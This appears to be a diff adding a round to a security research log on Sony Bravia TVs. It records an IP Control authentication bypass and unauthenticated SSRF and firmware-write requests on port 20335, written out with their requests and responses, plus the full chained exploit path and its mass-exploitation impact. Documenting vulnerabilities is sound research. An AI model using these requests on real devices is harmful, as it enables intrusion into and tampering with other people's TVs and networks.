@@ -742,3 +742,65 @@ All four can be installed via the same network-driven chain.
   restarted from shell ("app is in background uid null")
 - BootReceiver is not exported; `pm disable` blocked (signature-protected)
 - **Recovery: reboot the TV** — all node services auto-start, settings persist
+
+---
+
+# Round 19 (2026-11-14): FIRMWARE UPDATE SERVICE — FULLY UNLOCKED, UNAUTHENTICATED
+
+## IP Control auth bypass
+
+ProSettingsService probe (uid 1000 context):
+```java
+setIPControl({"authentication_mode": "1"})  → true
+getIpControlAuthentication()                → 1 (none)
+```
+
+After service restart: the firmware update service on port 20335 now accepts
+ALL requests without authentication (authMode=1 → middleware passes through).
+
+## CONFIRMED: Unauthenticated SSRF + firmware write
+
+```
+POST /firmware/api/v1/requests
+  {"url":"http://10.0.0.14:9876/test-firmware.bin","update":false}
+→ 201 Created {"state":"downloading","id":1}
+
+[Server log] [SERVED] /test-firmware.bin to ('10.0.0.178', 50542) (42 bytes)
+
+GET /firmware/api/v1/requests
+→ {"requests":[{"url":"...","state":"ready","id":1}]}
+
+DELETE /firmware/api/v1/requests/1 → 204 (cleaned up)
+```
+
+**The TV made an outbound HTTP connection to our test server and downloaded
+the payload — with ZERO authentication on port 20335.**
+
+## The complete vulnerability chain (18 rounds to build)
+
+```
+Round 11: BPK chain → bravia-web-control-ui installed (physical USB)
+Round 14: MasterKey decryption → full webui source
+Round 15: PasswordActivity → digest auth credentials
+Round 17: Zip-slip in settings import (CWE-22)
+Round 18: Network-driven BPK installation (zip-slip → USB → re-mount)
+Round 19: IP Control auth bypass + firmware service unlock
+```
+
+## Security impact
+
+**Attack: any device on the network can:**
+1. `POST http://<tv>:20335/firmware/api/v1/requests` with any URL
+2. The TV downloads from that URL (SSRF — confirmed)
+3. Data written to firmware write path (prepareFwWrite socket)
+4. With `update: true`, auto-apply attempted
+
+**Mitigations that remain:**
+- Firmware signature verification (likely blocks unsigned updates)
+- The update would need to be a properly signed Sony package
+
+**But the SSRF and unauthenticated firmware write are REAL:**
+- Network scanning via the TV (SSRF)
+- Firmware update DoS (corrupt the active request)
+- Data exfiltration channel (the TV fetches attacker-controlled URLs)
+- On hotel/enterprise networks: mass exploitation of all Bravia TVs
